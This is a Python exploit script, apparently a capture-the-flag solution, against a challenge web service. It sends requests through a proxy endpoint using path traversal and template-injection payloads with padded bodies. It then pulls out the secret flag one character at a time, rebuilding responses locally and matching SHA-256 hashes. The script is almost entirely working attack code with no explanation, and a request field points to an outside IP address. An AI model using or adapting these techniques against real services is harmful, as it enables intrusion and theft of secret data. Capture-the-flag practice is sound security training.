#!/usr/bin/env python3
import json
import requests
import base64
import subprocess
import hashlib
import string

target = 'http://serv2:8000'

knownFlag = ''
while(True):
	token = requests.post(f'{target}/login',json={
		'username':'lmaolmao',
		'password':'lmaolmao'
	}).json()['userToken']

	data = "A"*809+"""~a~~a~~a~~a~"""+"A"*(111-len(knownFlag))+"~flag~"
	query = "?a=$`$`$`$`$`&"

	r = requests.post(f'{target}/request',json={
		'dnsServer': '162.55.9.4',
		'path': '/../gen_email_template?a=$`$`$`$`$`',
		'method': 'POST',
		'body': data,
		'contentType': 'text/plain'
	})
	rr = r.headers
	r = r.json()
	assert(r['success'] == True)
	hs = r['id']
	msg = r['message'][r['message'].index('$')+1:]
	price = msg[:msg.index(' ')]
	dd = rr['Date']

	for ch in string.ascii_lowercase + string.ascii_uppercase + string.digits + '-_{}':
		tchkflag = 'flag='+knownFlag+ch
		z = {'headers':{},'body':'@@@@ pay $PRICE to admin to be able to see the response... or just be an admin maybe @@@@'.replace('PRICE',price)}
		r = requests.post(f'http://localhost:5003/internal/gen_email_template{query+tchkflag}',headers={'content-type':'text/plain','connection':'close'},data=data)
		for i in r.headers:
			if(i == 'Date'):
				z['headers'][i.lower()] = dd
			else:
				z['headers'][i.lower()] = r.headers[i]
		# print(z)
		g = subprocess.check_output(f"node -e 'console.log(JSON.stringify(JSON.parse(atob(`{base64.b64encode(json.dumps(z).encode()).decode()}`))))'",shell=True).decode().strip()
		ths = hashlib.sha256(g.encode()).digest().hex()
		if(ths == hs):
			knownFlag += ch
			print(knownFlag)
			break
	print(22)